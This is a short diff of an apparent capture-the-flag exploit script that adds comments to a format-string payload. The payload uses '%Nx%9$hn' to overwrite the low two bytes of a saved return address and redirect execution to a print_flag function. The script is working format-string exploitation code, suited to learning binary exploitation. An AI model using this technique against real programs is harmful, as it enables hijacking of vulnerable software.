@@ -136,10 +136,10 @@ print("RIP stack location: " + hex(rip_stack_location))
 
 
 # Write to RIP the 2 lower bytes of print_flag
-lower_2_bytes = ptr_to_print_flag & 0xFFFF
+lower_2_bytes = ptr_to_print_flag & 0xFFFF  # print_flag and main are on the same memory map 0x555555... only changing the last 2 bytes so there is no point in writing too much
 payload = b"A" * 8
-payload += bytes("%{0}x%9$hn....".format(int(lower_2_bytes)), encoding='utf8')
-payload += p64(rip_stack_location)
+payload += bytes("%{0}x%9$hn....".format(int(lower_2_bytes)), encoding='utf8')  # Added 4 "." for padding, to have the arguments aligned
+payload += p64(rip_stack_location)  # Having null bytes here is no problem, is the end of the payload anyway, as long as they are not in the middle of the address
 
 io.sendline(payload)
 
